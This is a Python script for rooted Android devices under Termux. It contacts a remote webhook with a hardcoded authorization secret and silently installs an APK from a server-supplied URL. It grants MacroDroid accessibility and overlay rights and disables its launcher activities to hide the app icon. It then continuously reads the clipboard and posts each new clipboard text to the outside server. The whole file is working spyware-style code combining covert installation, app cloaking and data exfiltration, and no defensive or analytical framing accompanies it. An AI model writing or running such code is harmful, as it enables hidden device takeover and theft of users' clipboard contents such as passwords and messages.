import sys
import time
import subprocess
import requests
import os
import re

if len(sys.argv) < 4:
    print(f"❌ [FATAL ERROR] Insufficient arguments to start! Received: {sys.argv}", flush=True)
    sys.exit(1)

DEVICE_ID = sys.argv[1]
GUILD_ID = sys.argv[2]
OWNER_ID = sys.argv[3]
URL_WEBHOOK = "https://hapiephoneugph.vercel.app/api/webhook"
AUTH_SECRET = "ugphoneoficialbrasil13willianz4z4oof$$$pitucho13"
HEADERS = {"Content-Type": "application/json", "Authorization": AUTH_SECRET}
APP_PACKAGE = "com.arlosoft.macrodroid"

subprocess.run("termux-wake-lock", shell=True, check=False)

def is_app_installed():
    try:
        res = subprocess.check_output(f'su -c "dumpsys package {APP_PACKAGE} | grep versionName"', shell=True, text=True).strip()
        return "versionName" in res
    except Exception:
        return False

def setup_macrodroid():
    print("⚙️ [SETUP] Configuring permissions and cloaking the app...", flush=True)
    commands = [
        'su -c "pm grant com.arlosoft.macrodroid android.permission.WRITE_EXTERNAL_STORAGE"',
        'su -c "pm grant com.arlosoft.macrodroid android.permission.READ_EXTERNAL_STORAGE"',
        'su -c "appops set com.arlosoft.macrodroid SYSTEM_ALERT_WINDOW allow"',
        'su -c "dumpsys deviceidle whitelist +com.arlosoft.macrodroid"',
        'su -c "settings put secure enabled_accessibility_services com.arlosoft.macrodroid/com.arlosoft.macrodroid.MacroDroidAccessibilityService"',
        'su -c "settings put secure accessibility_enabled 1"',
        'su -c "pm disable com.arlosoft.macrodroid/com.arlosoft.macrodroid.MainActivity"',
        'su -c "pm disable com.arlosoft.macrodroid/com.arlosoft.macrodroid.LauncherActivity"',
        'su -c "pm disable com.arlosoft.macrodroid/com.arlosoft.macrodroid.intro.IntroActivity"'
    ]
    
    for cmd in commands:
        subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL)
        time.sleep(0.3)
        
    print("✅ [SETUP] Permissions granted and icon successfully hidden!", flush=True)

def download_and_install(url):
    apk_path = "/sdcard/sys_app_temp.apk"
    try:
        print(f"🔗 [DOWNLOAD] Received link: {url}", flush=True)
        
        if "drive.google.com" in url or "docs.google.com" in url:
            print("⚠️ [WARNING] Google Drive link detected. Using gdown bypass...", flush=True)
            res_dl = subprocess.run(f'gdown "{url}" -O {apk_path}', shell=True)
            
            if res_dl.returncode != 0:
                print("❌ [ERROR] gdown failed. Make sure it is installed: pip install gdown", flush=True)
                return False
        else:
            response = requests.get(url, stream=True, timeout=60)
            response.raise_for_status()
            with open(apk_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk: 
                        f.write(chunk)
        
        if not os.path.exists(apk_path):
             print("❌ [ERROR] File was not created.", flush=True)
             return False

        size_mb = os.path.getsize(apk_path) / (1024 * 1024)
        print(f"📦 [DOWNLOAD] File saved. Size: {size_mb:.2f} MB", flush=True)
        
        if size_mb < 2.0:
            print("⚠️ [WARNING] File is too small (0MB or HTML error). Download blocked.", flush=True)
            print("🛑 [ABORT] Canceling installation to prevent system crash.", flush=True)
            os.remove(apk_path)
            return False

        print("⚙️ [INSTALL] Starting silent installation...", flush=True)
        res = subprocess.run(f'su -c "pm install -r {apk_path}"', shell=True, capture_output=True, text=True)
        
        print(f"🛠️ [INSTALL LOG] Output: {res.stdout.strip()} | Error: {res.stderr.strip()}", flush=True)
        
        if os.path.exists(apk_path):
            os.remove(apk_path)
            
        return "Success" in res.stdout
    except Exception as e:
        print(f"❌ [INTERNAL INSTALL ERROR] {e}", flush=True)
        if os.path.exists(apk_path):
            os.remove(apk_path)
        return False

def force_focus_and_read():
    try:
        subprocess.run('su -c "am start --activity-brought-to-front com.termux/.TermuxActivity" 2>/dev/null', shell=True)
        time.sleep(0.4)
        text = subprocess.check_output("termux-clipboard-get", shell=True, stderr=subprocess.DEVNULL).decode('utf-8').strip()
        subprocess.run('su -c "input keyevent 4" 2>/dev/null', shell=True)
        return text if text and text != "null" else ""
    except Exception:
        return ""

def check_authorization():
    try:
        installed = is_app_installed()
        
        if not installed:
            print("⚠️ [SYSTEM APP] MacroDroid not found on device. Requesting link...", flush=True)
        else:
            print("✅ [SYSTEM APP] MacroDroid is already installed.", flush=True)

        payload = {
            "ping": True,
            "device_id": DEVICE_ID,
            "guild_id": GUILD_ID,
            "owner_id": OWNER_ID,
            "app_system": not installed,
            "report": {
                "system_info": {
                    "model": "AutoCopy Ping",
                    "root_access": True,
                    "device_id": DEVICE_ID
                }
            }
        }
        response = requests.post(URL_WEBHOOK, json=payload, headers=HEADERS, timeout=15)
        
        if response.status_code == 200:
            data = response.json()
            
            if not installed:
                if "system_apk_url" in data:
                    print("📥 [DOWNLOAD] Downloading APK...", flush=True)
                    if download_and_install(data["system_apk_url"]):
                        print("🚀 [SUCCESS] Silent installation completed!", flush=True)
                        setup_macrodroid()
                        installed = True
                    else:
                        print("❌ [ERROR] Failed to install APK.", flush=True)
                else:
                    print("❌ [SERVER ERROR] Server did NOT send the app link (system_apk_url)!", flush=True)
                    
            return data.get("status") == "active" and installed
        return False
    except Exception as e:
        print(f"❌ [CONNECTION ERROR] {e}", flush=True)
        return False

def start_vigilante():
    print(f"👁️ [WATCHER] Activated for Guild: {GUILD_ID}. Waiting for texts...", flush=True)
    last_clip = force_focus_and_read()
    
    subprocess.run('su -c "logcat -c" 2>/dev/null', shell=True)
    cmd_watcher = 'su -c "logcat | grep -Ei \'clipboard|PrimaryClip|focus\'"'
    process = subprocess.Popen(cmd_watcher, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    while True:
        line = process.stdout.readline()
        if line:
            time.sleep(0.5)
            current = force_focus_and_read()
            
            if current and current != last_clip:
                if not is_app_installed():
                    print("🛑 [WATCHER] MacroDroid was uninstalled! Stopping operation.", flush=True)
                    process.terminate()
                    return

                try:
                    payload = {
                        "texto": current, 
                        "device_id": DEVICE_ID, 
                        "guild_id": GUILD_ID,
                        "owner_id": OWNER_ID
                    }
                    res = requests.post(URL_WEBHOOK, json=payload, headers=HEADERS, timeout=5)
                    
                    if res.status_code == 200:
                        data = res.json()
                        if data.get("status") == "shutdown":
                            print("🛑 [SHUTDOWN] Permission revoked by server.", flush=True)
                            process.terminate()
                            return
                            
                    last_clip = current
                except Exception:
                    process.terminate()
                    return

        if process.poll() is not None:
            process = subprocess.Popen(cmd_watcher, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

def main():
    print("📡 Starting system with Smart Ping...", flush=True)
    while True:
        if check_authorization():
            start_vigilante()
        else:
            print("😴 [WAITING] Rechecking in 5 min...", flush=True)
            time.sleep(300) 

if __name__ == "__main__":
    main()
